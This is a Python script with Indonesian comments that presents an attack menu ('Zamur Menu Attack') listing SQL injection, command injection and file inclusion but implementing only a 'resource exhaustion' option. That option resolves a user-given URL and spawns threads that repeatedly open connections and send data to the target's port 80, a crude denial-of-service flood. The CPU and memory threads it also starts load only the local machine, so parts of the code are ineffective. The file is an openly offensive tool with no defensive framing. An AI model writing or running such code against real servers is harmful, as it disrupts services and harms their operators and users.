import socket
import threading
import requests
from urllib.parse import urlparse

# Fungsi untuk mendapatkan IP dari URL dengan parsing
def get_target_ip(url):
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname
    return socket.gethostbyname(hostname)

# Fungsi serangan Resource Exhaustion (CPU, Memory, I/O)
def cpu_exhaustion():
    while True:
        x = 0
        for _ in range(1000000):
            x += 1

def memory_exhaustion():
    mem_leak = []
    while True:
        mem_leak.append('A' * 10**6)  # Membuat memory leak besar-besaran

def io_exhaustion(target_ip, target_port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # Tambahkan timeout untuk hindari stuck
            s.connect((target_ip, target_port))
            s.send(b"A" * 1024)  # Membanjiri I/O server dengan paket data
        except:
            pass

def resource_attack(target_ip, target_port):
    # Memulai serangan CPU
    for _ in range(10):  # Kurangi jumlah thread jika mesin lokal melambat
        threading.Thread(target=cpu_exhaustion).start()

    # Memulai serangan Memory
    for _ in range(10):
        threading.Thread(target=memory_exhaustion).start()

    # Memulai serangan Disk I/O
    for _ in range(10):
        threading.Thread(target=io_exhaustion, args=(target_ip, target_port)).start()

    print("[+] Serangan Resource Exhaustion dimulai...")

# Menu utama
def main():
    print("Zamur Menu Attack:")
    print("1. SQL Injection")
    print("2. Command Injection")
    print("3. Local File Inclusion (LFI)")
    print("4. Resource Exhaustion Attack (CPU, Memory, I/O)")
    
    choice = input("Masukkan pilihan: ")
    target_url = input("Masukkan URL target: ")
    
    if choice == "4":
        try:
            target_ip = get_target_ip(target_url)
            target_port = 80  # Port HTTP atau bisa diubah sesuai kebutuhan
            resource_attack(target_ip, target_port)
        except socket.gaierror as e:
            print(f"Error: {e}")
    else:
        print("Pilihan tidak valid.")

if __name__ == "__main__":
    main()
